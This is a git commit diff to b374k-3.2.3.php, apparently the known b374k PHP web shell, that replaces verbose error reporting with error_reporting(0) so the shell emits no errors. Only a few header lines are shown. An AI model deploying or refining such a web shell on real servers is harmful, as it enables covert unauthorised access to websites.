7062c742dad60805754eb9085c95fdad3905099c
JohnSleiman <32914975+JohnSleiman@users.noreply.github.com>
2017-10-18 19:41:13 -0300

    Update b374k-3.2.3.php

--- php/b374k/b374k-3.2.3.php
+++ php/b374k/b374k-3.2.3.php
@@ -14,7 +14,7 @@ $GLOBALS['ver'] = "3.2.3";
 $GLOBALS['title'] = "b374k";
 
 @ob_start();
-error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
+error_reporting(0);
 @ini_set('html_errors','0');
 @ini_set('display_errors','1');
 @ini_set('display_startup_errors','1');
